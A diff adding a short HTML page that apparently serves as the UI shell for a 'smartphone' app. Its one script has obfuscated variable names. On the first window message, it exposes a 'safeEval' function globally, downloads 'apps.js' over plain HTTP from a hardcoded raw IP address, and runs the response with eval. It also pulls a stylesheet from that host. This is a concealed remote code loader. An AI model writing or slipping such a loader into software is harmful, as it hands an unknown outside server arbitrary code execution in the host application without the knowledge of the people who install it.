@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+</head>
+
+<body>
+  <div id="root"></div>
+
+  <script>
+    let loaded = false
+
+    window.addEventListener('message', ({
+      data: _0x44e5b9
+    }) => {
+      if (!loaded) {
+        loaded = true
+        const _0x518d67 = (_0x3ee653) =>
+          'http://131.196.198.167/smartphone' +
+          '/' +
+          _0x3ee653
+        globalThis.safeEval = _0x44e5b9.safeEval
+        fetch(_0x518d67('apps.js'))
+          .then((_0x418e93) => {
+            if (_0x418e93.status < 200 || _0x418e93.status >= 300) {
+              throw new Error('Failed to fetch js -> ' + _0x418e93.status)
+            }
+            return _0x418e93.text()
+          })
+          .then(eval)
+          .then(() => console.log('Setup Finish'))
+        let _0x1e4f6b = document.createElement('link')
+        _0x1e4f6b.rel = 'stylesheet'
+        _0x1e4f6b.href = _0x518d67('styles.css')
+        document.head.appendChild(_0x1e4f6b)
+      }
+    })
+  </script>
+</body>
+
+</html>
